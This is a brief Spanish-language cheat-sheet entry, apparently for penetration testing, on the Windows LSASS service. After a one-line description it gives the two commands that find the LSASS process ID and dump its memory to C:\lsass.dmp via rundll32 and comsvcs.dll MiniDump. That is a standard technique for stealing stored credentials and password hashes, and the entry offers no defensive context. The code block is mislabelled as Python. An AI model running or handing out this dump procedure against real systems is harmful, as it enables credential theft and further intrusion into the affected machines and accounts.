# LSASS
## Descripción
SASS es un servicio crítico que desempeña un papel central en la gestión de credenciales y los procesos de autenticación en todos los sistemas operativos Windows

### Crear lsass.dmp usando powershell
```python
Get-Process lsass (obtener el PID del proceso lsass)
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```

